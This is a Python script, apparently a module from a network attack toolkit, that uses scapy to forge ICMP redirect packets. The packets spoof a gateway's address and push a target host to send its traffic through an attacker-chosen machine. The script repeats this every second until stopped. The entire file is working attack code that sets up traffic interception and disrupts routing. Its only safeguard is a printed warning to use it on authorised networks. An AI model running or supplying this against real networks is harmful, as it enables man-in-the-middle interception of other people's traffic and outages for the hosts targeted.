#!/usr/bin/env python3
"""
ICMP Redirect Module
Send fake ICMP redirect packets to manipulate routing tables
"""

import os
import sys
import time
import signal

try:
    from scapy.all import IP, ICMP, Raw, send, get_if_hwaddr
except ImportError:
    print("Error: scapy not installed")
    sys.exit(1)

def send_icmp_redirect(gateway_ip, target_ip, redirect_ip, interface="eth0"):
    """Send ICMP redirect packet"""
    try:
        # Get gateway MAC
        gateway_mac = get_if_hwaddr(interface)
        
        # Create ICMP redirect
        # ICMP redirect packet format:
        # ICMP type 5, code 0 (redirect for host)
        packet = IP(src=gateway_ip, dst=target_ip)/\
                 ICMP(type=5, code=0, nextmtu=0, gw=redirect_ip)/\
                 Raw(load=IP(src=gateway_ip, dst="1.1.1.1")/"\x00" * 8)
        
        send(packet, iface=interface, verbose=False)
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    gateway = os.getenv('ARG_GATEWAY')
    target = os.getenv('ARG_TARGET')
    redirect_to = os.getenv('ARG_REDIRECT_TO')
    interface = os.getenv('ARG_INTERFACE', 'eth0')
    
    if not gateway or not target or not redirect_to:
        print("Error: gateway, target, and redirect_to required")
        sys.exit(1)
    
    print(f"[!] WARNING: ICMP redirect can disrupt network routing")
    print(f"[!] Only use on networks you own or have permission to test")
    print(f"\n[*] ICMP Redirect Module")
    print(f"[*] Gateway: {gateway}")
    print(f"[*] Target: {target}")
    print(f"[*] Redirect to: {redirect_to}")
    print(f"[*] Interface: {interface}")
    
    sent = 0
    start_time = time.time()
    
    def signal_handler(sig, frame):
        print(f"\n[+] Sent {sent} redirect packets")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        print(f"\n[*] Sending ICMP redirect packets...")
        
        # Send redirect packets periodically
        while True:
            if send_icmp_redirect(gateway, target, redirect_to, interface):
                sent += 1
                print(f"[+] Sent redirect packet {sent}", end='\r')
            
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n[+] Stopped. Sent {sent} packets")
    except PermissionError:
        print("Error: This requires root/administrator privileges")
        sys.exit(1)
    except Exception as e:
        print(f"\nError: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
